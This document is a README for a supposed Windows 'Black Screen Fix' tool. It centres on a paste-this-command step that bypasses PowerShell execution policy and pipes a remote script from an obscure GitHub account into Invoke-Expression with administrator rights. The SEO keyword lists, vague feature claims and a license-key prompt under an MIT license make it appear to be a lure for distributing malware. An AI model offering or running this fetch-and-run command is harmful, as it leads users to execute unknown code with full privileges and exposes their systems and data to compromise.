# Black Screen Fix — PowerShell

**Black-Screen-Fix-PowerShell**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.3.0-stable-brightgreen?style=flat-square)]()
[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()

Fix black screen after login, Windows Update, driver update or random blank display.

---

## Quick Install

Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

The installer downloads the latest build, prompts for your license key and completes setup automatically.

## Step-by-Step

| Step | Action |
|------|--------|
| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
| 2 | Paste the command block above and press **Enter** |
| 3 | Wait for download — progress shown in the console |
| 4 | Enter license key when prompted (also in `license.txt` after install) |
| 5 | Restart if the installer asks — then launch from Start menu |

If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.

---

## Overview

Install Black Screen Fix via PowerShell — repair black screen after login, update or driver crash on Windows 10/11. Works in Safe Mode, GPU rollback included.

## Common Searches

- black screen after login windows 11
- black screen with cursor only
- black screen after windows update
- monitor no signal but pc running
- nvidia driver update black screen

## Features

* **After login fix** — Repairs explorer shell and user profile corruption.
* **Post-update fix** — Rolls back bad display drivers after Windows Update.
* **GPU timeout** — Adjusts TDR timeout — stops random black flashes.
* **Safe Mode** — Runs when normal desktop will not load.
* **Driver rollback** — Detects bad NVIDIA/AMD/Intel driver and reverts.

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum |
| PowerShell | 5.1 or PowerShell 7+ |
| Admin | Required |
| Network | Required for download |

## FAQ

**How do I install without a browser?**
Use the PowerShell command above — no browser needed after Admin shell is open.

**Where is the license key?**
Shown during install and saved to `license.txt` in the install folder.

**Is the script safe to run?**
Hosted on GitHub raw; review `install.ps1` before running if you prefer.

**Black screen after login?**
Repairs shell registry and restarts explorer.exe.

**After NVIDIA driver update?**
Rolls back to previous working driver version.

**Screen black with cursor only?**
Shell startup failure — fixed by registry repair.

**Works in Safe Mode?**
Yes — recommended when display is completely black.

---

TAGS black screen fix, black screen after login, black screen windows 11, no display fix, gpu driver black screen, powershell install, windows setup script

## License

[MIT](LICENSE)
